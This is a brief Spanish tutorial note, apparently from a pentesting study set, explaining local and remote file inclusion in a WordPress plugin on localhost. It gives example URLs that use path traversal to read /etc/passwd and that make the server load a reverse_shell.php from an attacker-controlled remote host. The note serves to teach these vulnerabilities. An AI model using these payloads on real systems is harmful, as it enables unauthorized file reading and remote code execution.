LFI / RFI


LOCAL FILE INCLUSION

A traves de una mala sanitización de la web podemos acceder a archivos del servidor

http://localhost/wp/wp-plugin/lfi/lfi.php?file=../../../../../../etc/passwd

En este ejemplo aprovechamos la vulnerabilidad de un plugin que nos permite leer archivos del servidor y aplicamos un path transversal para ver el archivo /etc/passwd

REMOTE FILE INCLUSION

A traves de una mala sanitización de la web podemos acceder a archivos externos desde el servidor

http://localhost/wp/wp-plugin/rfi/rfi.php?path=http://remoteserver/reverse_shell.php

En este ejemplo vemos que un RFI es todo lo contrario a un LFI, ya que en este apuntamos desde el servidor victima hacia nuestra maquina atacante
